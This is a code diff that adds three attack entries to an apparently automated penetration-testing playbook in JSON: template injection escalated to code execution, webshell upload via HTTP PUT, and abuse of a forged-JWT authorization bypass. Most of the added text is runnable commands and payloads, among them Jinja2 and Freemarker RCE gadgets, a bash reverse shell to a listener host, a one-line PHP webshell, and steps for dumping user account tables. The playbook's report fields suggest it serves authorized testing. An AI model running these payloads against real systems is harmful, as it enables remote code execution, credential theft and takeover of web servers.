@@ -729,6 +729,141 @@
       "autonomy": "manual"
     },
     {
+      "id": "ssti-to-rce",
+      "title": "SSTI to Code Execution",
+      "hypothesis": "A confirmed template injection is one engine-specific payload away from running commands. Fingerprint the engine from how it evaluated your probe (Jinja2, Twig, Freemarker, Velocity, Mako, ERB each have a known RCE gadget), then escalate from {{7*7}} to a command, and from a command to a reverse shell. This is the step that turns 'the template evaluated my math' into a foothold.",
+      "tool": "curl",
+      "tools": [
+        "curl",
+        "python3"
+      ],
+      "requires_all": [
+        "web.ssti_confirmed"
+      ],
+      "produces": [
+        "foothold.webshell",
+        "web.cmdi_confirmed"
+      ],
+      "priority": 57,
+      "proves": "code execution on the web host through the template engine",
+      "does_not_prove": "persistence or privilege, this is the initial foothold as the web service account",
+      "report": {
+        "finding": "Remote Code Execution via Server-Side Template Injection",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://portswigger.net/web-security/server-side-template-injection",
+        "https://github.com/payloadbox/ssti-payloads"
+      ],
+      "commands": [
+        {
+          "tool": "curl",
+          "run": "curl -s -G {{url}} --data-urlencode \"name={{'{{'}}7*7{{'}}'}}\"",
+          "note": "Confirm the engine: 49 is Jinja2/Twig-style, 7777777 is Twig concat, an error names the engine. That tells you which RCE gadget to use next."
+        },
+        {
+          "tool": "curl",
+          "run": "curl -s -G {{url}} --data-urlencode \"name={{ssti_rce_payload}}\"",
+          "note": "The engine-specific RCE gadget, e.g. Jinja2 {{'{{'}}cycler.__init__.__globals__.os.popen('id').read(){{'}}'}} or Freemarker <#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}. uid=... in the response is code execution."
+        },
+        {
+          "tool": "python3",
+          "run": "python3 -c \"import urllib.request,urllib.parse; print(urllib.request.urlopen('{{url}}?name='+urllib.parse.quote('{{ssti_shell_payload}}')).read())\"",
+          "note": "Swap the command for a reverse shell one-liner (bash -i >& /dev/tcp/{{lhost}}/4444 0>&1, URL-encoded) and catch it with the listener card for a full foothold."
+        }
+      ]
+    },
+    {
+      "id": "http-put-webshell",
+      "title": "Upload a Webshell via HTTP PUT",
+      "hypothesis": "When the allowed-methods check showed PUT (or a WebDAV verb) enabled, the server will often write a file you hand it straight into the web root — and a file you can write and then request is code execution. Confirm PUT works, drop a webshell for the server's language, and call it. This is a direct foothold that costs one request.",
+      "tool": "curl",
+      "tools": [
+        "curl",
+        "davtest",
+        "cadaver",
+        "nmap"
+      ],
+      "requires_all": [
+        "http.methods"
+      ],
+      "produces": [
+        "foothold.webshell"
+      ],
+      "priority": 56,
+      "proves": "an uploaded, executing webshell on the target — a foothold as the web service account",
+      "does_not_prove": "that every path is writable, only the one you wrote to; nor any privilege beyond the web user",
+      "report": {
+        "finding": "Arbitrary File Upload via HTTP PUT / WebDAV",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav"
+      ],
+      "commands": [
+        {
+          "tool": "curl",
+          "run": "curl -s -X PUT {{url}}/shell.php --data-binary @shell.php",
+          "note": "Write a webshell (e.g. <?php system($_GET['c']); ?>) into the web root. A 201/204 means it took; match the extension to the stack (.jsp, .aspx)."
+        },
+        {
+          "tool": "curl",
+          "run": "curl -s \"{{url}}/shell.php?c=id\"",
+          "note": "Request what you wrote and run a command. uid=... (or the Windows whoami) is your foothold; swap in a reverse shell and catch it with the listener card."
+        },
+        {
+          "tool": "davtest",
+          "run": "davtest -url {{url}}",
+          "note": "When WebDAV is in play, davtest probes which extensions it will accept and execute, so you upload one that actually runs rather than guessing."
+        }
+      ]
+    },
+    {
+      "id": "authz-abuse",
+      "title": "Abuse the Authorization Bypass",
+      "hypothesis": "An auth bypass — a forged JWT, a NoSQL/GraphQL/mass-assignment flaw, request smuggling, or a stolen admin session from XSS — is only the doorway. The win is what the privileged surface behind it lets you do: dump the user table for reusable credentials, flip your own account to admin, and above all find the admin-only file upload, config writer, or template editor that turns 'I am admin' into code execution.",
+      "tool": "curl",
+      "tools": [
+        "curl"
+      ],
+      "requires_any": [
+        "web.authz_bypass",
+        "web.jwt_secret",
+        "web.xss_confirmed"
+      ],
+      "produces": [
+        "foothold.webshell",
+        "credential.candidate"
+      ],
+      "priority": 55,
+      "proves": "what the bypassed authorization grants — privileged functionality, dumped accounts, and often an admin-only path to code execution",
+      "does_not_prove": "a shell by itself; the bypass opens the door, the upload/config/RCE feature behind it is what lands the foothold",
+      "report": {
+        "finding": "Privilege Escalation via Broken Access Control",
+        "severity": "high"
+      },
+      "refs": [
+        "https://owasp.org/Top10/A01_2021-Broken_Access_Control/"
+      ],
+      "commands": [
+        {
+          "tool": "curl",
+          "run": "curl -s {{url}}/admin -H \"Authorization: Bearer {{forged_jwt}}\"",
+          "note": "Reach the admin surface with the forged token or bypassed session. Map every privileged action it exposes — user management, settings, uploads."
+        },
+        {
+          "tool": "curl",
+          "run": "curl -s {{url}}/admin/users -H \"Authorization: Bearer {{forged_jwt}}\"",
+          "note": "Dump the user/account listing: password hashes and reused credentials here feed crack-identify and the spray/reuse cards."
+        },
+        {
+          "tool": "curl",
+          "run": "curl -s -X POST {{url}}/admin/upload -H \"Authorization: Bearer {{forged_jwt}}\" -F \"file=@shell.php\"",
+          "note": "The payoff: an admin-only upload or template/config writer is code execution. Upload a webshell, request it (uid=...), and you have a foothold."
+        }
+      ]
+    },
+    {
       "id": "nosql-injection",
       "title": "NoSQL Injection",
       "hypothesis": "Logins backed by MongoDB will frequently accept operator objects in place of plain strings: user[$ne]=x&pass[$ne]=x signs you in as the first account (typically admin). And where equality holds but you still need the password, pulling it out with $regex leaks it one character at a time, the Mango approach.",
